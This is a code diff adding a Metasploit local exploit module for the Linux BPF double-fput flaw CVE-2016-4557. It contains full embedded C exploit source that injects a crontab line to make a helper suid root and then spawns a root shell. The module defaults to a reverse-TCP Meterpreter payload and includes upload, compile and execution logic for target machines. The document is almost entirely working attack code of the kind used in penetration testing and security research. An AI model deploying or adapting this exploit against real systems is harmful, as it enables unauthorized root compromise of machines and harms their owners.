@@ -1,0 +1,501 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GoodRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Post::File
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super( update_info( info, {
+        'Name'          => 'Linux BPF Local Privilege Escalation',
+        'Description'   => %q{
+          Linux kernel >=4.4 with CONFIG_BPF_SYSCALL and kernel.unprivileged_bpf_disabled
+          sysctl is not set to 1, BPF can be abused to priv escalate.
+          Ubuntu 16.04 has all of these conditions met.
+        },
+        'License'       => MSF_LICENSE,
+        'Author'        =>
+          [
+            'jannh@google.com',                    # discovery
+            'h00die <mike@shorebreaksecurity.com>' # metasploit module
+          ],
+        'Platform'      => [ 'linux' ],
+        'Arch'          => [ ARCH_X86, ARCH_X86_64 ],
+        'SessionTypes'  => [ 'shell', 'meterpreter' ],
+        'References'    =>
+          [
+            [ 'CVE', '2016-4557' ],
+            [ 'EDB', '39772' ],
+            [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=808' ],
+            [ 'URL', 'https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7' ]
+          ],
+        'Targets'       =>
+          [
+            [ 'Linux x86',       { 'Arch' => ARCH_X86 } ],
+            [ 'Linux x64',       { 'Arch' => ARCH_X86_64 } ]
+          ],
+        'DefaultOptions' =>
+          {
+            'payload' => 'linux/x64/mettle/reverse_tcp',
+            'PrependFork' => true,
+            'WfsDelay' => 60 # we can chew up a lot of CPU for this, so we want to give time for payload to come through
+            },
+        'DefaultTarget' => 1,
+        'DisclosureDate' => 'May 04 2016',
+        'Privileged'     => true
+      }
+      ))
+    register_options([
+        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
+        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']]),
+        OptInt.new('MAXWAIT', [ true, 'Max seconds to wait for decrementation in seconds', 120 ])
+      ], self.class)
+  end
+
+  def check
+    def check_config_bpf_syscall?()
+      output = cmd_exec('grep CONFIG_BPF_SYSCALL /boot/config-`uname -r`')
+      if output == 'CONFIG_BPF_SYSCALL=y'
+        vprint_good('CONFIG_BPF_SYSCALL is set to yes')
+        return true
+      else
+        print_error('CONFIG_BPF_SYSCALL is NOT set to yes')
+        return false
+      end
+    end
+
+    def check_kernel_disabled?()
+      output = cmd_exec('sysctl kernel.unprivileged_bpf_disabled')
+      if output != 'kernel.unprivileged_bpf_disabled = 1'
+        vprint_good('kernel.unprivileged_bpf_disabled is NOT set to 1')
+        return true
+      else
+        print_error('kernel.unprivileged_bpf_disabled is set to 1')
+        return false
+      end
+    end
+
+    def check_fuse?()
+      lib = cmd_exec('dpkg --get-selections | grep ^fuse')
+      if lib.include?('install')
+        vprint_good('fuse is installed')
+        return true
+      else
+        print_error('fuse is not installed.  Exploitation will fail.')
+        return false
+      end
+    end
+
+    def mount_point_exists?()
+      if directory?('/tmp/fuse_mount')
+        print_error('/tmp/fuse_mount should be unmounted and deleted.  Exploitation will fail.')
+        return false
+      else
+        vprint_good('/tmp/fuse_mount doesn\'t exist')
+        return true
+      end
+    end
+
+    if check_config_bpf_syscall?() && check_kernel_disabled?() && check_fuse?() && mount_point_exists?()
+      CheckCode::Appears
+    else
+      CheckCode::Safe
+    end
+  end
+
+  def exploit
+
+    def upload_and_compile(filename, file_path, file_content, compile=nil)
+      rm_f "#{file_path}"
+      if not compile.nil?
+        rm_f "#{file_path}.c"
+        vprint_status("Writing #{filename} to #{file_path}.c")
+        write_file("#{file_path}.c", file_content)
+        register_file_for_cleanup("#{file_path}.c")
+        output = cmd_exec(compile)
+        if output != ''
+          print_error(output)
+          fail_with(Failure::Unknown, "#{filename} at #{file_path}.c failed to compile")
+        end
+      else
+        vprint_status("Writing #{filename} to #{file_path}")
+        write_file(file_path, file_content)
+      end
+      cmd_exec("chmod +x #{file_path}");
+      register_file_for_cleanup(file_path)
+    end
+
+    doubleput = %q{
+      #define _GNU_SOURCE
+      #include <stdbool.h>
+      #include <errno.h>
+      #include <err.h>
+      #include <unistd.h>
+      #include <fcntl.h>
+      #include <sched.h>
+      #include <signal.h>
+      #include <stdlib.h>
+      #include <stdio.h>
+      #include <string.h>
+      #include <sys/types.h>
+      #include <sys/stat.h>
+      #include <sys/syscall.h>
+      #include <sys/prctl.h>
+      #include <sys/uio.h>
+      #include <sys/mman.h>
+      #include <sys/wait.h>
+      #include <linux/bpf.h>
+      #include <linux/kcmp.h>
+
+      #ifndef __NR_bpf
+      # if defined(__i386__)
+      #  define __NR_bpf 357
+      # elif defined(__x86_64__)
+      #  define __NR_bpf 321
+      # elif defined(__aarch64__)
+      #  define __NR_bpf 280
+      # else
+      #  error
+      # endif
+      #endif
+
+      int uaf_fd;
+
+      int task_b(void *p) {
+        /* step 2: start writev with slow IOV, raising the refcount to 2 */
+        char *cwd = get_current_dir_name();
+        char data[2048];
+        sprintf(data, "* * * * * root /bin/chown root:root '%s'/suidhelper; /bin/chmod 06755 '%s'/suidhelper\n#", cwd, cwd);
+        struct iovec iov = { .iov_base = data, .iov_len = strlen(data) };
+        if (system("fusermount -u /home/user/ebpf_mapfd_doubleput/fuse_mount 2>/dev/null; mkdir -p fuse_mount && ./hello ./fuse_mount"))
+          errx(1, "system() failed");
+        int fuse_fd = open("fuse_mount/hello", O_RDWR);
+        if (fuse_fd == -1)
+          err(1, "unable to open FUSE fd");
+        if (write(fuse_fd, &iov, sizeof(iov)) != sizeof(iov))
+          errx(1, "unable to write to FUSE fd");
+        struct iovec *iov_ = mmap(NULL, sizeof(iov), PROT_READ, MAP_SHARED, fuse_fd, 0);
+        if (iov_ == MAP_FAILED)
+          err(1, "unable to mmap FUSE fd");
+        fputs("starting writev\n", stderr);
+        ssize_t writev_res = writev(uaf_fd, iov_, 1);
+        /* ... and starting inside the previous line, also step 6: continue writev with slow IOV */
+        if (writev_res == -1)
+          err(1, "writev failed");
+        if (writev_res != strlen(data))
+          errx(1, "writev returned %d", (int)writev_res);
+        fputs("writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.\n", stderr);
+        while (1) sleep(1); /* whatever, just don't crash */
+      }
+
+      void make_setuid(void) {
+        /* step 1: open writable UAF fd */
+        uaf_fd = open("/dev/null", O_WRONLY|O_CLOEXEC);
+        if (uaf_fd == -1)
+          err(1, "unable to open UAF fd");
+        /* refcount is now 1 */
+
+        char child_stack[20000];
+        int child = clone(task_b, child_stack + sizeof(child_stack), CLONE_FILES | SIGCHLD, NULL);
+        if (child == -1)
+          err(1, "clone");
+        sleep(3);
+        /* refcount is now 2 */
+
+        /* step 2+3: use BPF to remove two references */
+        for (int i=0; i<2; i++) {
+          struct bpf_insn insns[2] = {
+            {
+              .code = BPF_LD | BPF_IMM | BPF_DW,
+              .src_reg = BPF_PSEUDO_MAP_FD,
+              .imm = uaf_fd
+            },
+            {
+            }
+          };
+          union bpf_attr attr = {
+            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
+            .insn_cnt = 2,
+            .insns = (__aligned_u64) insns,
+            .license = (__aligned_u64)""
+          };
+          if (syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr)) != -1)
+            errx(1, "expected BPF_PROG_LOAD to fail, but it didn't");
+          if (errno != EINVAL)
+            err(1, "expected BPF_PROG_LOAD to fail with -EINVAL, got different error");
+        }
+        /* refcount is now 0, the file is freed soon-ish */
+
+        /* step 5: open a bunch of readonly file descriptors to the target file until we hit the same pointer */
+        int status;
+        int hostnamefds[1000];
+        int used_fds = 0;
+        bool up = true;
+        while (1) {
+          if (waitpid(child, &status, WNOHANG) == child)
+            errx(1, "child quit before we got a good file*");
+          if (up) {
+            hostnamefds[used_fds] = open("/etc/crontab", O_RDONLY);
+            if (hostnamefds[used_fds] == -1)
+              err(1, "open target file");
+            if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, hostnamefds[used_fds]) == 0) break;
+            used_fds++;
+            if (used_fds == 1000) up = false;
+          } else {
+            close(hostnamefds[--used_fds]);
+            if (used_fds == 0) up = true;
+          }
+        }
+        fputs("woohoo, got pointer reuse\n", stderr);
+        while (1) sleep(1); /* whatever, just don't crash */
+      }
+
+      int main(void) {
+        pid_t child = fork();
+        if (child == -1)
+          err(1, "fork");
+        if (child == 0)
+          make_setuid();
+        struct stat helperstat;
+        while (1) {
+          if (stat("suidhelper", &helperstat))
+            err(1, "stat suidhelper");
+          if (helperstat.st_mode & S_ISUID)
+            break;
+          sleep(1);
+        }
+        fputs("suid file detected, launching rootshell...\n", stderr);
+        execl("./suidhelper", "suidhelper", NULL);
+        err(1, "execl suidhelper");
+      }
+    }
+
+    suid_helper = %q{
+      #include <unistd.h>
+      #include <err.h>
+      #include <stdio.h>
+      #include <sys/types.h>
+
+      int main(void) {
+        if (setuid(0) || setgid(0))
+          err(1, "setuid/setgid");
+        fputs("we have root privs now...\n", stderr);
+        execl("/bin/bash", "bash", NULL);
+        err(1, "execl");
+      }
+
+    }
+
+    hello = %q{
+      /*
+        FUSE: Filesystem in Userspace
+        Copyright (C) 2001-2007  Miklos Szeredi <miklos@szeredi.hu>
+        heavily modified by Jann Horn <jannh@google.com>
+
+        This program can be distributed under the terms of the GNU GPL.
+        See the file COPYING.
+
+        gcc -Wall hello.c `pkg-config fuse --cflags --libs` -o hello
+      */
+
+      #define FUSE_USE_VERSION 26
+
+      #include <fuse.h>
+      #include <stdio.h>
+      #include <string.h>
+      #include <errno.h>
+      #include <fcntl.h>
+      #include <unistd.h>
+      #include <err.h>
+      #include <sys/uio.h>
+
+      static const char *hello_path = "/hello";
+
+      static char data_state[sizeof(struct iovec)];
+
+      static int hello_getattr(const char *path, struct stat *stbuf)
+      {
+        int res = 0;
+        memset(stbuf, 0, sizeof(struct stat));
+        if (strcmp(path, "/") == 0) {
+          stbuf->st_mode = S_IFDIR | 0755;
+          stbuf->st_nlink = 2;
+        } else if (strcmp(path, hello_path) == 0) {
+          stbuf->st_mode = S_IFREG | 0666;
+          stbuf->st_nlink = 1;
+          stbuf->st_size = sizeof(data_state);
+          stbuf->st_blocks = 0;
+        } else
+          res = -ENOENT;
+        return res;
+      }
+
+      static int hello_readdir(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi) {
+        filler(buf, ".", NULL, 0);
+        filler(buf, "..", NULL, 0);
+        filler(buf, hello_path + 1, NULL, 0);
+        return 0;
+      }
+
+      static int hello_open(const char *path, struct fuse_file_info *fi) {
+        return 0;
+      }
+
+      static int hello_read(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi) {
+        sleep(10);
+        size_t len = sizeof(data_state);
+        if (offset < len) {
+          if (offset + size > len)
+            size = len - offset;
+          memcpy(buf, data_state + offset, size);
+        } else
+          size = 0;
+        return size;
+      }
+
+      static int hello_write(const char *path, const char *buf, size_t size, off_t offset, struct fuse_file_info *fi) {
+        if (offset != 0)
+          errx(1, "got write with nonzero offset");
+        if (size != sizeof(data_state))
+          errx(1, "got write with size %d", (int)size);
+        memcpy(data_state + offset, buf, size);
+        return size;
+      }
+
+      static struct fuse_operations hello_oper = {
+        .getattr	= hello_getattr,
+        .readdir	= hello_readdir,
+        .open		= hello_open,
+        .read		= hello_read,
+        .write		= hello_write,
+      };
+
+      int main(int argc, char *argv[]) {
+        return fuse_main(argc, argv, &hello_oper, NULL);
+      }
+    }
+
+    hello_filename = 'hello'
+    hello_path = "#{datastore['WritableDir']}/#{hello_filename}"
+    doubleput_file = "#{datastore['WritableDir']}/doubleput"
+    suidhelper_filename = 'suidhelper'
+    suidhelper_path = "#{datastore['WritableDir']}/#{suidhelper_filename}"
+    payload_filename = rand_text_alpha(8)
+    payload_path = "#{datastore['WritableDir']}/#{payload_filename}"
+
+    if check != CheckCode::Appears
+      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')
+    end
+
+    def has_prereqs?()
+      def check_libfuse_dev?()
+        lib = cmd_exec('dpkg --get-selections | grep libfuse-dev')
+        if lib.include?('install')
+          vprint_good('libfuse-dev is installed')
+          return true
+        else
+          print_error('libfuse-dev is not installed.  Compiling will fail.')
+          return false
+        end
+      end
+      def check_gcc?()
+        gcc = cmd_exec('which gcc')
+        if gcc.include?('gcc')
+          vprint_good('gcc is installed')
+          return true
+        else
+          print_error('gcc is not installed.  Compiling will fail.')
+          return false
+        end
+      end
+      def check_pkgconfig?()
+        lib = cmd_exec('dpkg --get-selections | grep ^pkg-config')
+        if lib.include?('install')
+          vprint_good('pkg-config is installed')
+          return true
+        else
+          print_error('pkg-config is not installed.  Exploitation will fail.')
+          return false
+        end
+      end
+      return check_libfuse_dev?() && check_gcc?() && check_pkgconfig?()
+    end
+
+    compile = false
+    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'
+      if has_prereqs?()
+        compile = true
+        vprint_status('Live compiling exploit on system')
+      else
+        vprint_status('Dropping pre-compiled exploit on system')
+      end
+    end
+
+    if compile == false
+      # doubleput file
+      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4557', 'doubleput')
+      fd = ::File.open( path, "rb")
+      doubleput = fd.read(fd.stat.size)
+      fd.close
+      # hello file
+      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4557', 'hello')
+      fd = ::File.open( path, "rb")
+      hello = fd.read(fd.stat.size)
+      fd.close
+      # suidhelper file
+      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4557', 'suidhelper')
+      fd = ::File.open( path, "rb")
+      suid_helper = fd.read(fd.stat.size)
+      fd.close
+
+      # overwrite with the hardcoded variable names in the compiled versions
+      payload_filename = 'AyDJSaMM'
+      payload_path = '/tmp/AyDJSaMM'
+    end
+
+    # make our substitutions so things are dynamic
+    suid_helper.gsub!(/execl\("\/bin\/bash", "bash", NULL\);/,
+               "return execl(\"#{payload_path}\", \"\", NULL);") #launch our payload, and do it in a return to not freeze the executable
+    doubleput.gsub!(/execl\(".\/suidhelper", "suidhelper", NULL\);/,
+                'exit(0);')
+    print_status('Writing files to target')
+    cmd_exec("cd #{datastore['WritableDir']}")
+    upload_and_compile('hello', hello_path, hello, compile ? "gcc -o #{hello_filename} #{hello_filename}.c -Wall -std=gnu99 `pkg-config fuse --cflags --libs`" : nil)
+    upload_and_compile('doubleput', doubleput_file, doubleput, compile ? "gcc -o #{doubleput_file} #{doubleput_file}.c -Wall" : nil)
+    upload_and_compile('suidhelper', suidhelper_path, suid_helper, compile ? "gcc -o #{suidhelper_filename} #{suidhelper_filename}.c -Wall" : nil)
+    upload_and_compile('payload', payload_path, generate_payload_exe)
+
+    print_status('Starting execution of priv esc.  This may take about 120 seconds')
+
+    cmd_exec(doubleput_file)
+    sec_waited = 0
+    until sec_waited > datastore['MAXWAIT'] do
+      Rex.sleep(1)
+      # check file permissions
+      if cmd_exec("ls -lah #{suidhelper_path}").include?('-rwsr-sr-x 1 root root')
+        print_good('got root, starting payload')
+        print_error('This exploit may require process killing of \'hello\', and \'doubleput\' on the target')
+        print_error('This exploit may require manual umounting of /tmp/fuse_mount via \'fusermount -z -u /tmp/fuse_mount\' on the target')
+        print_error('This exploit may require manual deletion of /tmp/fuse_mount via \'rm -rf /tmp/fuse_mount\' on the target')
+        cmd_exec("#{suidhelper_path}")
+        return
+      end
+      sec_waited +=1
+    end
+  end
+
+  def on_new_session(session)
+    # if we don't /bin/bash here, our payload times out
+    # [*] Meterpreter session 2 opened (192.168.199.131:4444 -> 192.168.199.130:37022) at 2016-09-27 14:15:04 -0400
+    # [*] 192.168.199.130 - Meterpreter session 2 closed.  Reason: Died
+    session.shell_command_token('/bin/bash')
+    super
+  end
+end
